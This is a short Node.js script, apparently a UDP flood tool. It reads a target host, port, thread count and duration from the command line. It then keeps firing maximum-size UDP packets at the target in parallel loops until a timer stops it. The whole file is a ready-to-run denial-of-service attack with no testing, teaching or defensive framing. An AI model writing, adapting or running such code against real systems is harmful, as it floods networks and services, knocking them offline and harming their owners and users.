const udp = require('dgram');

const host   = process.argv[2];
const port   = parseInt(process.argv[3]);
const thread = parseInt(process.argv[4]);
const time = parseInt(process.argv[5]);


const client = udp.createSocket('udp4');
const data = Buffer.allocUnsafe(65507);

for (let i = 0; i < thread; i++) {
    (function sendPacket() {
        client.send(data, port, host, sendPacket);
    })();
}
setTimeout(() => {
    console.log('Time is up. Stopping threads...');
    process.exit(0);
}, time * 1000);